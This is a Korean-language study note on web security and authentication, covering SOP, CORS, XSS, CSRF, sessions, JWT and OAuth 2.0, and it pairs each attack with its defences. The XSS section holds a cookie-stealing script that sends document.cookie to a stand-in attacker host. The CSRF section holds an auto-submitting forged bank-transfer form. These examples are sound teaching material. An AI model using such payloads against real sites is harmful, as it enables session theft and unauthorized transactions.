# 7주차 - Web Security / 인증

## 공통 키워드

### 1. SOP (Same-Origin Policy, 동일 출처 정책)

브라우저가 **같은 출처(Origin)** 에서 온 리소스끼리만 자유롭게 상호작용할 수 있도록 제한하는 보안 정책이다.

#### Origin (출처)

Origin은 **Scheme(프로토콜) + Host(도메인) + Port** 의 조합이며, 세 가지가 모두 같아야 같은 출처로 본다.

`https://example.com:443` 기준으로 비교하면 다음과 같다.

| URL | 같은 출처? | 이유 |
| --- | --- | --- |
| `https://example.com/users` | O | Path는 출처에 포함되지 않음 |
| `http://example.com` | X | Scheme이 다름 |
| `https://api.example.com` | X | Host가 다름 |
| `https://example.com:8080` | X | Port가 다름 |

#### 왜 필요할까?

- SOP가 없다면 사용자가 악성 사이트에 접속했을 때, 그 사이트의 스크립트가 사용자가 로그인해 둔 다른 사이트(예: 은행)에 요청을 보내고 **응답 내용까지 읽어갈 수 있다.**
- SOP는 다른 출처의 응답을 스크립트가 읽지 못하게 막아 이런 정보 유출을 방지한다.

#### 특징

- SOP는 **브라우저**가 적용하는 정책이다. (Postman이나 서버 간 통신에는 적용되지 않음)
- 요청 자체를 막는 것이 아니라, 보통은 요청은 서버까지 가고 **응답을 읽는 것을 막는다.**
- `<img>`, `<script>`, `<link>`, `<form>` 등 HTML 태그를 통한 리소스 로드나 전송은 다른 출처여도 허용된다.
- 하지만 실제로는 프론트엔드(`localhost:3000`)와 백엔드(`localhost:8080`)처럼 다른 출처끼리 통신해야 하는 경우가 많기 때문에, 이를 안전하게 허용해주는 방법이 **CORS** 이다.


### 2. CORS (Cross-Origin Resource Sharing, 교차 출처 리소스 공유)

SOP로 인해 막혀 있는 다른 출처 간의 리소스 공유를, **서버가 허용한 경우에 한해** 가능하게 해주는 메커니즘이다.

- 브라우저는 요청에 `Origin` 헤더를 담아 보낸다.
- 서버는 응답에 `Access-Control-Allow-Origin` 헤더로 허용할 출처를 알려준다.
- 브라우저는 응답 헤더를 확인해서 요청한 출처가 허용되어 있으면 응답을 스크립트에 전달하고, 아니면 **CORS 에러**를 발생시킨다.

#### 주요 응답 헤더

| 헤더 | 설명 |
| --- | --- |
| `Access-Control-Allow-Origin` | 허용할 출처 (예: `https://example.com`, `*`) |
| `Access-Control-Allow-Methods` | 허용할 HTTP Method (예: `GET, POST, PUT`) |
| `Access-Control-Allow-Headers` | 허용할 요청 헤더 (예: `Content-Type, Authorization`) |
| `Access-Control-Allow-Credentials` | Cookie 등 인증 정보를 포함한 요청을 허용할지 여부 |
| `Access-Control-Max-Age` | Preflight 결과를 캐싱할 시간(초) |

#### CORS 요청 방식

- **Simple Request (단순 요청)**
  - Preflight 없이 바로 본 요청을 보낸다.
  - 조건: Method가 `GET`, `HEAD`, `POST` 중 하나이고, `Content-Type`이 `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded` 중 하나이며, 기본 헤더 외의 커스텀 헤더가 없어야 한다.
- **Preflight Request (사전 요청)**
  - 본 요청을 보내기 전에 `OPTIONS` Method로 "이런 요청을 보내도 되는지" 서버에 먼저 확인한다.
  - 서버가 허용하면 그때 본 요청을 보낸다.
  - 예: `Content-Type: application/json`이나 `Authorization` 헤더를 사용하는 요청
- **Credentialed Request (인증 정보 포함 요청)**
  - Cookie 등을 함께 보내는 요청 (`fetch`의 `credentials: 'include'`, axios의 `withCredentials: true`)
  - 서버는 `Access-Control-Allow-Credentials: true`를 응답해야 하고, `Access-Control-Allow-Origin`에 `*`를 사용할 수 없다. (정확한 출처를 명시해야 함)

> CORS 에러는 브라우저에서 발생하는 에러이므로, 해결은 프론트엔드가 아니라 **서버에서 허용할 출처를 설정**하는 것이 기본이다. (개발 환경에서는 프록시를 사용하기도 한다.)


### 3. XSS (Cross-Site Scripting)

공격자가 웹 페이지에 **악성 스크립트를 삽입**해서, 다른 사용자의 브라우저에서 그 스크립트가 실행되도록 하는 공격이다.

- 스크립트가 피해자의 브라우저에서 해당 사이트의 출처로 실행되기 때문에 SOP로 막을 수 없다.
- 이를 통해 Cookie나 Token 탈취, 사용자 몰래 요청 보내기, 피싱 페이지로 이동 등이 가능하다.

```html
<!-- 게시글 내용에 이런 스크립트를 넣는 경우 -->
<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
```

#### 종류

| 종류 | 설명 |
| --- | --- |
| Stored XSS (저장형) | 악성 스크립트가 게시글, 댓글 등으로 **서버 DB에 저장**되어, 해당 페이지를 조회하는 모든 사용자에게 실행됨 |
| Reflected XSS (반사형) | URL 파라미터 등에 담긴 스크립트를 서버가 **그대로 응답에 포함**해 돌려줘서 실행됨 (주로 악성 링크를 클릭하게 유도) |
| DOM-based XSS | 서버를 거치지 않고, 클라이언트 JavaScript가 URL 등의 값을 **DOM에 그대로 넣으면서** 실행됨 (예: `innerHTML`) |

#### 방어 방법

- **입력값 검증 및 출력 시 이스케이프(Escape)**: `<`, `>` 같은 특수문자를 `&lt;`, `&gt;` 등으로 변환해 HTML로 해석되지 않게 한다.
  - React는 기본적으로 이스케이프 처리를 해주지만, `dangerouslySetInnerHTML`을 쓰면 직접 처리해야 한다.
- `innerHTML` 대신 `textContent` 사용
- HTML을 허용해야 하는 경우 DOMPurify 같은 라이브러리로 **Sanitize(위험한 태그/속성 제거)**
- **CSP (Content Security Policy)** 헤더로 실행 가능한 스크립트의 출처를 제한
- Cookie에 **HttpOnly** 옵션을 설정해 JavaScript로 Cookie에 접근하지 못하게 한다.


### 4. CSRF (Cross-Site Request Forgery, 사이트 간 요청 위조)

사용자가 로그인된 상태를 이용해, 공격자가 **사용자의 의도와 상관없이** 특정 요청(송금, 비밀번호 변경 등)을 보내게 만드는 공격이다.

#### 공격 과정

1. 사용자가 `bank.com`에 로그인해서 브라우저에 세션 Cookie가 저장되어 있다.
2. 사용자가 공격자가 만든 악성 사이트에 접속한다.
3. 악성 사이트에는 `bank.com`으로 요청을 보내는 코드가 숨겨져 있다.
   ```html
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="1000000" />
   </form>
   <script>document.forms[0].submit()</script>
   ```
4. 브라우저는 `bank.com`으로 가는 요청에 **Cookie를 자동으로 포함**하기 때문에, 서버는 정상적인 사용자의 요청으로 판단하고 처리한다.

> 공격자는 응답을 읽을 필요 없이 요청만 보내면 되기 때문에 SOP로 막을 수 없다.

#### 방어 방법

- **CSRF Token**: 서버가 발급한 임의의 토큰을 폼이나 헤더에 함께 보내게 하고, 서버에서 검증한다. (공격자는 이 토큰 값을 알 수 없음)
- **SameSite Cookie**: Cookie에 `SameSite=Strict` 또는 `Lax`를 설정해 다른 사이트에서 보내는 요청에는 Cookie가 포함되지 않게 한다. (최신 브라우저는 기본값이 `Lax`)
- **Referer / Origin 헤더 검증**: 요청이 허용된 출처에서 왔는지 확인한다.
- 중요한 요청에는 비밀번호 재입력, 추가 인증 등을 요구한다.
- 데이터를 변경하는 작업에는 GET을 사용하지 않는다.

#### XSS vs CSRF

| 구분 | XSS | CSRF |
| --- | --- | --- |
| 공격 방식 | 사이트에 악성 **스크립트를 삽입**해 실행 | 사용자의 인증 정보를 이용해 **요청을 위조** |
| 실행 위치 | 피해자의 브라우저 (공격 대상 사이트 안) | 공격자의 사이트에서 대상 서버로 요청 |
| 목적 | 정보 탈취, 임의 동작 수행 등 | 사용자 권한으로 특정 동작 수행 |
| 대표 방어 | 이스케이프, CSP, HttpOnly | CSRF Token, SameSite Cookie |


### 5. 인증 / 인가

#### 인증 (Authentication)

사용자가 **누구인지 확인**하는 과정이다.

- 예: 아이디/비밀번호로 로그인, 소셜 로그인, 지문 인식
- 인증에 실패하면 `401 Unauthorized`를 응답한다.

#### 인가 (Authorization)

인증된 사용자가 **특정 리소스에 접근할 권한이 있는지 확인**하는 과정이다.

- 예: 일반 사용자는 관리자 페이지에 접근 불가, 본인이 작성한 게시글만 수정 가능
- 권한이 없으면 `403 Forbidden`을 응답한다.
- 항상 **인증이 먼저** 이루어지고, 그 다음에 인가가 이루어진다.

| 구분 | 인증 (Authentication) | 인가 (Authorization) |
| --- | --- | --- |
| 질문 | 너 누구야? | 너 이거 해도 돼? |
| 순서 | 먼저 | 인증 이후 |
| 실패 시 응답 | 401 Unauthorized | 403 Forbidden |
| 예시 | 로그인 | 관리자 권한 확인 |

> HTTP는 Stateless이기 때문에, 한 번 인증한 사용자를 다음 요청에서도 알아보기 위해 **Cookie/Session** 이나 **Token(JWT)** 방식을 사용한다.


### 6. Cookie / Session

#### Cookie

서버가 클라이언트(브라우저)에 저장하도록 보내는 **작은 데이터 조각(Key-Value)** 이다.

- 서버가 응답 헤더 `Set-Cookie`로 Cookie를 전달하면 브라우저가 저장한다.
- 이후 같은 도메인으로 요청할 때 브라우저가 `Cookie` 헤더에 **자동으로 담아서** 보낸다.
- 클라이언트에 저장되므로 사용자가 직접 보거나 수정할 수 있어, 민감한 정보를 저장하면 안 된다.

```http
Set-Cookie: sessionId=abc123; Path=/; Max-Age=3600; HttpOnly; Secure; SameSite=Lax
```

| 옵션 | 설명 |
| --- | --- |
| `Expires` / `Max-Age` | Cookie 만료 시간 (없으면 브라우저를 닫을 때 삭제되는 세션 Cookie) |
| `Domain` / `Path` | Cookie를 보낼 도메인과 경로 |
| `HttpOnly` | JavaScript(`document.cookie`)로 접근 불가 → XSS로 인한 탈취 방지 |
| `Secure` | HTTPS 요청에서만 전송 |
| `SameSite` | 다른 사이트에서 보내는 요청에 Cookie를 포함할지 여부 (`Strict`, `Lax`, `None`) → CSRF 방지 |

#### Session

사용자의 인증 정보를 **서버에 저장**하고, 클라이언트에는 그 정보를 찾을 수 있는 **Session ID**만 Cookie로 전달하는 방식이다.

1. 사용자가 로그인하면 서버는 사용자 정보를 Session 저장소에 저장하고 Session ID를 생성한다.
2. 서버는 Session ID를 `Set-Cookie`로 클라이언트에 전달한다.
3. 클라이언트는 이후 요청마다 Cookie에 Session ID를 담아 보낸다.
4. 서버는 Session ID로 Session 저장소를 조회해 사용자를 확인한다.

- 장점
  - 중요한 정보는 서버에 있고 클라이언트에는 의미 없는 Session ID만 있어 상대적으로 안전하다.
  - 서버에서 Session을 삭제하면 바로 로그아웃(강제 만료)시킬 수 있다.
- 단점
  - 사용자가 많아질수록 서버 저장소의 부담이 커진다.
  - 서버를 여러 대로 늘리면 Session을 공유해야 하는 문제가 생긴다. (Sticky Session이나 Redis 같은 공용 Session 저장소로 해결)
  - Cookie를 사용하므로 CSRF에 대한 대비가 필요하다.

#### Cookie vs Session

| 구분 | Cookie | Session |
| --- | --- | --- |
| 저장 위치 | 클라이언트 (브라우저) | 서버 |
| 보안 | 상대적으로 취약 (노출/변조 가능) | 상대적으로 안전 |
| 서버 부담 | 없음 | 사용자 수만큼 저장 공간 필요 |
| 속도 | 빠름 | 매 요청마다 저장소 조회가 필요 |


### 7. JWT (JSON Web Token)

사용자 정보를 JSON 형태로 담고 **서명(Signature)** 해서 만든 토큰으로, 서버에 상태를 저장하지 않는 **Token 기반 인증**에 주로 사용된다.

#### 구조

`Header.Payload.Signature` 세 부분으로 이루어져 있고, 각 부분은 Base64URL로 인코딩되어 `.`으로 구분된다.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6IlVTRVIifQ.xxxxxxxx
```

| 구성 | 설명 |
| --- | --- |
| Header | 토큰 타입(`typ`)과 서명 알고리즘(`alg`, 예: HS256, RS256) |
| Payload | 사용자 ID, 권한, 만료 시간(`exp`) 등 전달할 정보(**Claim**) |
| Signature | Header + Payload를 서버의 Secret Key로 서명한 값 → **위변조 여부 확인** |

- Payload는 암호화가 아니라 **인코딩**이기 때문에 누구나 디코딩해서 볼 수 있다. → 비밀번호 같은 민감한 정보를 넣으면 안 된다.
- 누군가 Payload를 수정하면 Signature가 맞지 않게 되어 서버에서 검증에 실패한다.

#### 인증 과정

1. 사용자가 로그인하면 서버가 JWT를 발급해 클라이언트에 전달한다.
2. 클라이언트는 JWT를 저장해 두고, 요청마다 `Authorization: Bearer <JWT>` 헤더에 담아 보낸다.
3. 서버는 Signature와 만료 시간을 검증하고, Payload의 정보로 사용자를 확인한다. (별도 저장소 조회 X)

#### 장점

- 서버가 상태를 저장하지 않아(Stateless) 서버 확장(Scale-out)이 쉽다.
- 토큰 자체에 정보가 있어서 매번 DB나 Session 저장소를 조회하지 않아도 된다.
- 여러 서버나 서비스(MSA) 간 인증에 사용하기 좋다.

#### 단점

- 한 번 발급하면 만료 전까지 서버가 **강제로 무효화하기 어렵다.** (탈취되면 만료 전까지 악용 가능)
- Session ID보다 크기가 커서 매 요청마다 전송량이 늘어난다.
- Payload가 노출되므로 담을 수 있는 정보가 제한적이다.

#### Access Token / Refresh Token

탈취 위험을 줄이기 위해 보통 토큰을 두 가지로 나눠서 사용한다.

| 구분 | Access Token | Refresh Token |
| --- | --- | --- |
| 용도 | API 요청 시 인증 | Access Token이 만료되면 재발급 받을 때 사용 |
| 유효 기간 | 짧게 (예: 30분) | 길게 (예: 2주) |
| 저장 | 클라이언트 (메모리 등) | 클라이언트(HttpOnly Cookie 등) + 서버(DB, Redis)에도 저장해 관리 |

- Access Token의 유효 기간을 짧게 해 탈취되더라도 피해를 줄이고, Refresh Token은 서버에서 관리해 필요하면 무효화할 수 있다.

#### Session vs JWT

| 구분 | Session | JWT |
| --- | --- | --- |
| 상태 저장 | 서버 (Stateful) | 클라이언트 (Stateless) |
| 확장성 | Session 공유 문제 있음 | 확장 쉬움 |
| 강제 만료 | 쉬움 (Session 삭제) | 어려움 |
| 전송 데이터 | 작은 Session ID | 상대적으로 큰 토큰 |


### 8. OAuth (OAuth 2.0)

사용자가 비밀번호를 직접 넘겨주지 않고, 다른 서비스(Google, Kakao 등)에 있는 자신의 정보에 대한 **접근 권한을 제3자 애플리케이션에 위임(인가)** 할 수 있게 해주는 표준 프로토콜이다.

- 예: "카카오로 로그인" → 우리 서비스는 카카오 비밀번호를 모른 채 카카오가 허용한 범위의 사용자 정보(닉네임, 이메일 등)를 받아올 수 있다.
- OAuth는 원래 **인가**를 위한 프로토콜이다. 로그인(인증) 용도로 확장한 것이 **OIDC (OpenID Connect)** 이며, 사용자 정보가 담긴 ID Token(JWT)을 함께 발급한다.

#### 구성 요소

| 구성 요소 | 설명 | 예시 |
| --- | --- | --- |
| Resource Owner | 리소스(정보)의 주인 | 사용자 |
| Client | 사용자 대신 리소스에 접근하려는 애플리케이션 | 우리 서비스 |
| Authorization Server | 사용자를 인증하고 Access Token을 발급하는 서버 | 카카오 인증 서버 |
| Resource Server | 사용자 정보를 가지고 있는 서버 | 카카오 API 서버 |

#### Authorization Code Grant 흐름 (가장 많이 쓰는 방식)

1. 사용자가 "카카오로 로그인" 버튼을 클릭하면, Client는 사용자를 Authorization Server의 로그인 페이지로 이동(Redirect)시킨다.
2. 사용자가 로그인하고 정보 제공에 동의한다.
3. Authorization Server는 미리 등록된 **Redirect URI**로 **Authorization Code**를 담아 사용자를 돌려보낸다.
4. Client(서버)는 Authorization Code와 Client Secret을 이용해 Authorization Server에 **Access Token**을 요청한다.
5. Client는 Access Token으로 Resource Server에서 사용자 정보를 조회한다.
6. 받아온 정보로 우리 서비스의 회원가입/로그인을 처리하고, 자체 Session이나 JWT를 발급한다.

- Access Token을 바로 주지 않고 Authorization Code를 거치는 이유
  - Redirect는 브라우저 URL을 통해 전달되므로 노출될 위험이 있다.
  - 그래서 짧게 유효한 Code만 URL로 전달하고, 실제 Access Token은 서버끼리(Back Channel) Client Secret과 함께 교환해 더 안전하다.
- 브라우저 앱이나 모바일 앱처럼 Client Secret을 안전하게 보관할 수 없는 경우에는 **PKCE**를 함께 사용해 Code 탈취 공격을 방지한다.
- `state` 파라미터를 사용해 요청과 응답이 같은 흐름인지 확인하여 CSRF 공격을 방지한다.

#### 주요 용어

- **Scope**: Client가 요청하는 접근 권한의 범위 (예: `profile`, `email`)
- **Redirect URI**: 인증 후 Authorization Code를 전달받을 주소 (미리 등록된 주소만 허용)
- **Client ID / Client Secret**: Authorization Server에 등록한 Client의 식별자와 비밀 키
